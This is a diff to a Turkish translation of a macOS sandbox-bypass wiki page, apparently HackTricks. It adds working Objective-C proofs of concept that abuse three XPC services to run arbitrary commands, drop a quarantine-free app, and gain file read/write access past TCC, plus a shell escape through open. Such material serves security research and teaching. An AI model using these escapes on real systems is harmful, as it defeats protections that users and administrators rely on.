@@ -10,7 +10,7 @@
 
 Derleyici, `/usr/lib/libSystem.B.dylib` dosyasını ikili dosyaya bağlayacaktır.
 
-Daha sonra, **`libSystem.B`**, **`xpc_pipe_routine`** uygulamanın yetkilerini **`securityd`**'ye gönderene kadar diğer birkaç fonksiyonu çağıracaktır. Securityd, sürecin Sandbox içinde karantinaya alınması gerekip gerekmediğini kontrol eder ve eğer öyleyse, karantinaya alır.\
+Daha sonra, **`libSystem.B`**, **`xpc_pipe_routine`** uygulamanın yetkilerini **`securityd`**'ye göndermeden önce birkaç başka fonksiyonu çağıracaktır. Securityd, sürecin Sandbox içinde karantinaya alınması gerekip gerekmediğini kontrol eder ve eğer öyleyse, karantinaya alınacaktır.\
 Son olarak, sandbox, **`__sandbox_ms`** çağrısıyla etkinleştirilecek ve bu da **`__mac_syscall`**'ı çağıracaktır.
 
 ## Olası Bypass'ler
@@ -28,13 +28,13 @@ Bu, [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbo
 
 ### Open işlevselliğini kötüye kullanma
 
-[**Son Word sandbox bypass örneklerinde**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv), **`open`** cli işlevselliğinin sandbox'ı atlamak için nasıl kötüye kullanılabileceği görülebilir.
+[**Word sandbox bypass**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) son örneklerinde, **`open`** cli işlevselliğinin sandbox'ı atlamak için nasıl kötüye kullanılabileceği görülebilir.
 
 {{#ref}}
 macos-office-sandbox-bypasses.md
 {{#endref}}
 
-### Başlatma Ajanları/Daemon'lar
+### Başlatma Ajanları/Daemon'ları
 
 Bir uygulama **sandbox'lı olacak şekilde tasarlanmışsa** (`com.apple.security.app-sandbox`), örneğin bir LaunchAgent'tan **çalıştırıldığında** sandbox'ı atlamak mümkündür.\
 [**Bu yazıda**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818) açıklandığı gibi, sandbox'lı bir uygulama ile kalıcılık kazanmak istiyorsanız, otomatik olarak bir LaunchAgent olarak çalıştırılmasını sağlayabilir ve belki de DyLib çevre değişkenleri aracılığıyla kötü niyetli kod enjekte edebilirsiniz.
@@ -43,7 +43,7 @@ Bir uygulama **sandbox'lı olacak şekilde tasarlanmışsa** (`com.apple.securit
 
 Eğer bir sandbox'lı süreç, **sonrasında bir sandbox'sız uygulamanın ikili dosyasını çalıştıracağı** bir yere **yazabiliyorsa**, oraya ikili dosyayı yerleştirerek **kaçabilir**. Bu tür konumların iyi bir örneği `~/Library/LaunchAgents` veya `/System/Library/LaunchDaemons`'dır.
 
-Bunun için belki de **2 adım** gerekebilir: Daha **izin verici bir sandbox** (`file-read*`, `file-write*`) ile bir sürecin kodunuzu çalıştırmasını sağlamak ve bu kodun aslında **sandbox'sız çalıştırılacağı** bir yere yazmasını sağlamak.
+Bunun için belki de **2 adım** gerekebilir: Daha **izin verici bir sandbox** (`file-read*`, `file-write*`) ile bir sürecin kodunuzu çalıştırmasını sağlamak ve bu kodun aslında **sandbox'sız çalıştırılacak** bir yere yazmasını sağlamak.
 
 **Otomatik Başlatma konumları** hakkında bu sayfayı kontrol edin:
 
@@ -53,29 +53,190 @@ Bunun için belki de **2 adım** gerekebilir: Daha **izin verici bir sandbox** (
 
 ### Diğer süreçleri kötüye kullanma
 
-Eğer o sandbox sürecinden, daha az kısıtlayıcı sandbox'larda (veya hiç) çalışan **diğer süreçleri tehlikeye atabiliyorsanız**, onların sandbox'larından kaçabilirsiniz:
+Eğer o sandbox sürecinden, daha az kısıtlayıcı sandbox'larda (veya hiç) çalışan **diğer süreçleri tehlikeye atabiliyorsanız**, onların sandbox'larına kaçabilirsiniz:
 
 {{#ref}}
 ../../../macos-proces-abuse/
 {{#endref}}
 
+### Mevcut Sistem ve Kullanıcı Mach hizmetleri
+
+Sandbox, ayrıca `application.sb` profilinde tanımlanan belirli **Mach hizmetleri** ile iletişim kurmaya da izin verir. Eğer bu hizmetlerden birini **kötüye kullanmayı** başarırsanız, **sandbox'tan kaçabilirsiniz**.
+
+[Bu yazıda](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) belirtildiği gibi, Mach hizmetleri hakkında bilgi `/System/Library/xpc/launchd.plist` dosyasında saklanmaktadır. Tüm Sistem ve Kullanıcı Mach hizmetlerini bulmak için o dosyada `<string>System</string>` ve `<string>User</string>` araması yapabilirsiniz.
+
+Ayrıca, bir Mach hizmetinin sandbox'lı bir uygulama için mevcut olup olmadığını kontrol etmek için `bootstrap_look_up` çağrısı yapabilirsiniz:
+```objectivec
+void checkService(const char *serviceName) {
+mach_port_t service_port = MACH_PORT_NULL;
+kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
+if (!err) {
+NSLog(@"available service:%s", serviceName);
+mach_port_deallocate(mach_task_self_, service_port);
+}
+}
+
+void print_available_xpc(void) {
+NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
+NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
+for (NSString* key in launchDaemons) {
+NSDictionary<NSString*, id>* job = launchDaemons[key];
+NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
+for (NSString* serviceName in machServices) {
+checkService(serviceName.UTF8String);
+}
+}
+}
+```
+### Mevcut PID Mach hizmetleri
+
+Bu Mach hizmetleri, bu yazıda [sandbox'tan kaçmak için ilk olarak istismar edildi](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). O zaman, bir uygulama ve çerçevesi tarafından **gerekli olan tüm XPC hizmetleri** uygulamanın PID alanında görünür durumdaydı (bunlar `ServiceType` olarak `Application` olan Mach Hizmetleridir).
+
+Bir PID Domain XPC hizmeti ile **iletişim kurmak için**, uygulama içinde şu şekilde kaydetmek yeterlidir:
+```objectivec
+[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
+```
+Ayrıca, tüm **Application** Mach hizmetlerini `System/Library/xpc/launchd.plist` içinde `<string>Application</string>` arayarak bulmak mümkündür.
+
+Geçerli xpc hizmetlerini bulmanın bir diğer yolu ise şunları kontrol etmektir:
+```bash
+find /System/Library/Frameworks -name "*.xpc"
+find /System/Library/PrivateFrameworks -name "*.xpc"
+```
+Bu tekniği kötüye kullanan birkaç örnek [**orijinal yazıda**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) bulunabilir, ancak aşağıda bazı özetlenmiş örnekler verilmiştir.
+
+#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc
+
+Bu hizmet, her XPC bağlantısına her zaman `YES` döndürerek izin verir ve `runTask:arguments:withReply:` metodu, keyfi bir komutu keyfi parametrelerle çalıştırır.
+
+Sömürü "şu kadar basitti":
+```objectivec
+@protocol SKRemoteTaskRunnerProtocol
+-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
+@end
+
+void exploit_storagekitfsrunner(void) {
+[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
+NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
+conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
+[conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
+[conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
+[conn resume];
+
+[[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
+NSLog(@"run task result:%@, error:%@", bSucc, error);
+}];
+}
+```
+#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc
+
+Bu XPC servisi, her istemciye her zaman YES döndürerek izin verdi ve `createZipAtPath:hourThreshold:withReply:` metodu, sıkıştırılacak bir klasörün yolunu belirtmeye olanak tanıdı ve bunu bir ZIP dosyası olarak sıkıştırdı.
+
+Bu nedenle, sahte bir uygulama klasör yapısı oluşturmak, sıkıştırmak, ardından açmak ve çalıştırmak mümkün, çünkü yeni dosyalar karantina niteliğine sahip olmayacak.
+
+Sömürü şuydu:
+```objectivec
+@protocol AudioAnalyticsHelperServiceProtocol
+-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
+-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
+@end
+void exploit_AudioAnalyticsHelperService(void) {
+NSString *currentPath = NSTemporaryDirectory();
+chdir([currentPath UTF8String]);
+NSLog(@"======== preparing payload at the current path:%@", currentPath);
+system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
+[@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
+system("chmod +x compressed/poc.app/Contents/MacOS/poc");
+
+[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
+NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
+conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
+[conn resume];
+
+[[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
+NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
+NSString *file;
+while ((file = [dirEnum nextObject])) {
+if ([[file pathExtension] isEqualToString: @"zip"]) {
+// open the zip
+NSString *cmd = [@"open " stringByAppendingString:file];
+system([cmd UTF8String]);
+
+sleep(3); // wait for decompression and then open the payload (poc.app)
+NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
+system([cmd2 UTF8String]);
+break;
+}
+}
+}];
+}
+```
+#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc
+
+Bu XPC servisi, `extendAccessToURL:completion:` yöntemi aracılığıyla XPC istemcisine keyfi bir URL'ye okuma ve yazma erişimi verme imkanı tanır ve bu yöntem herhangi bir bağlantıyı kabul eder. XPC servisi FDA'ya sahip olduğundan, bu izinlerin kötüye kullanılması TCC'yi tamamen atlatmak için mümkündür.
+
+Sömürü şuydu:
+```objectivec
+@protocol WFFileAccessHelperProtocol
+- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
+@end
+typedef int (*PFN)(const char *);
+void expoit_ShortcutsFileAccessHelper(NSString *target) {
+[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
+NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
+conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
+[conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
+[conn resume];
+
+[[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
+NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
+NSURL *targetURL = [fpWrapper url];
+
+void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
+PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
+if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
+NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
+else {
+NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
+NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
+}
+}];
+}
+```
 ### Statik Derleme & Dinamik Bağlama
 
-[**Bu araştırma**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) Sandbox'ı atlamak için 2 yol keşfetti. Çünkü sandbox, **libSystem** kütüphanesi yüklendiğinde kullanıcı alanından uygulanır. Eğer bir ikili dosya bunu yüklemekten kaçınabilirse, asla sandbox'a alınmaz:
+[**Bu araştırma**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) Sandbox'ı atlatmanın 2 yolunu keşfetti. Çünkü sandbox, **libSystem** kütüphanesi yüklendiğinde kullanıcı alanından uygulanır. Eğer bir ikili bu kütüphaneyi yüklemekten kaçınabilirse, asla sandbox'a alınmaz:
 
-- Eğer ikili dosya **tamamen statik olarak derlenmişse**, o kütüphaneyi yüklemekten kaçınabilir.
-- Eğer **ikili dosya herhangi bir kütüphaneyi yüklemeye ihtiyaç duymuyorsa** (çünkü bağlayıcı da libSystem'dadır), libSystem'i yüklemeye ihtiyaç duymayacaktır.
+- Eğer ikili **tamamen statik olarak derlenmişse**, o kütüphaneyi yüklemekten kaçınabilir.
+- Eğer **ikili herhangi bir kütüphaneyi yüklemeye ihtiyaç duymuyorsa** (çünkü bağlayıcı da libSystem'dadır), libSystem'i yüklemesine gerek kalmaz.
 
-### Shell kodları
+### Shell Kodları
 
-**Shell kodlarının** ARM64'te bile `libSystem.dylib`'de bağlanması gerektiğini unutmayın:
+**Shell kodlarının** ARM64'te bile `libSystem.dylib` içinde bağlanması gerektiğini unutmayın:
 ```bash
 ld -o shell shell.o -macosx_version_min 13.0
 ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
 ```
-### Yetkiler
+### Devralınmayan kısıtlamalar
 
-Not edin ki, bir uygulama belirli bir **yetkiye** sahipse, bazı **hareketler** **sandbox tarafından izin verilebilir**.
+**[bu yazının bonusunda](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)** açıklandığı gibi, bir sandbox kısıtlaması şöyle:
+```
+(version 1)
+(allow default)
+(deny file-write* (literal "/private/tmp/sbx"))
+```
+örneğin yeni bir süreç tarafından atlatılabilir:
+```bash
+mkdir -p /tmp/poc.app/Contents/MacOS
+echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
+chmod +x /tmp/poc.app/Contents/MacOS/poc
+open /tmp/poc.app
+```
+Ancak, elbette, bu yeni süreç ebeveyn süreçten hakları veya ayrıcalıkları miras almayacaktır.
+
+### Haklar
+
+Bir uygulama belirli bir **hakka** sahipse, bazı **hareketlerin** **sandbox tarafından izin verilebileceğini** unutmayın, örneğin:
 ```scheme
 (when (entitlement "com.apple.security.network.client")
 (allow network-outbound (remote ip))
@@ -163,7 +324,7 @@ Sandbox Bypassed!
 ```
 ### Debug & bypass Sandbox with lldb
 
-Sandbox'lı olması gereken bir uygulama derleyelim:
+Sandbox'lı bir uygulama derleyelim: 
 
 {{#tabs}}
 {{#tab name="sand.c"}}
@@ -295,7 +456,7 @@ Process 2517 resuming
 Sandbox Bypassed!
 Process 2517 exited with status = 0 (0x00000000)
 ```
-> [!WARNING] > **Sandbox atlatılsa bile TCC** kullanıcıdan masaüstünden dosya okumak için işlemi izin verip vermeyeceğini soracaktır.
+> [!WARNING] > **Sandbox atlatılsa bile TCC** kullanıcıdan masaüstünden dosyaları okumak için işlemi izin verip vermeyeceğini soracaktır.
 
 ## References
 
